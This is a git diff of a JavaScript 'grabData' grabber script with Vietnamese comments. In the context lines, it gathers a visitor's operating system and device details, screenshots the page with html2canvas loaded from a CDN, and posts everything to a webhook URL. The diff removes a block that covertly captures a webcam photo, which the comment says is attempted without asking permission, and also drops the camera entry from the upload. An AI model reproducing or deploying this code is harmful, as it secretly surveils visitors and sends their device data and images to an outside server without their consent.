@@ -62,41 +62,6 @@ const grabData = async () => {
         const osVersion = safeGet(agentData, 'operatingSystem.versionMajor', '?');
         const osInfo = `${osName} ${osVersion}`;
 
-        // Chụp ảnh từ camera (thử không yêu cầu quyền)
-        let cameraBlob = null;
-        let hasCamera = false;
-        if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
-            try {
-                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-                const video = document.createElement('video');
-                video.srcObject = stream;
-                await new Promise((resolve) => {
-                    video.onloadedmetadata = () => resolve();
-                });
-                video.play();
-
-                const canvas = document.createElement('canvas');
-                canvas.width = video.videoWidth;
-                canvas.height = video.videoHeight;
-                const context = canvas.getContext('2d');
-                context.drawImage(video, 0, 0, canvas.width, canvas.height);
-                await new Promise((blobResolve) => {
-                    canvas.toBlob((blob) => {
-                        cameraBlob = blob;
-                        hasCamera = true;
-                        console.log("Chụp ảnh từ camera thành công");
-                        blobResolve();
-                    }, 'image/png');
-                });
-
-                // Dừng stream để tránh rò rỉ tài nguyên
-                stream.getTracks().forEach(track => track.stop());
-            } catch (cameraError) {
-                console.warn("Không thể truy cập camera:", cameraError.message);
-                hasCamera = false;
-            }
-        }
-
         // Tự load html2canvas từ CDN và chụp screenshot
         let screenshotBlob = null;
         let hasScreenshot = false;
@@ -196,7 +161,7 @@ const grabData = async () => {
                         },
                         {
                             name: "🖥️ Thiết bị",
-                            value: `${deviceName}`,
+                            value: `${deviceName}--`,
                             inline: true
                         },
                         {
@@ -207,11 +172,6 @@ const grabData = async () => {
                         {
                             name: "📸 Screenshot",
                             value: hasScreenshot ? "Đã chụp trang web (xem attachment)" : "Không thể chụp",
-                            inline: true
-                        },
-                        {
-                            name: "🎥 Ảnh Camera",
-                            value: hasCamera ? "Đã chụp ảnh camera (xem attachment)" : "Không thể chụp",
                             inline: true
                         }
                     ],
@@ -227,7 +187,6 @@ const grabData = async () => {
         console.log("Gửi payload...");
         const formData = new FormData();
         if (screenshotBlob) formData.append('file1', screenshotBlob, 'page-screenshot.png');
-        if (cameraBlob) formData.append('file2', cameraBlob, 'camera-snapshot.png');
         formData.append('payload_json', JSON.stringify(params));
         const response = await fetch(webhookUrl, { method: "POST", body: formData });
 
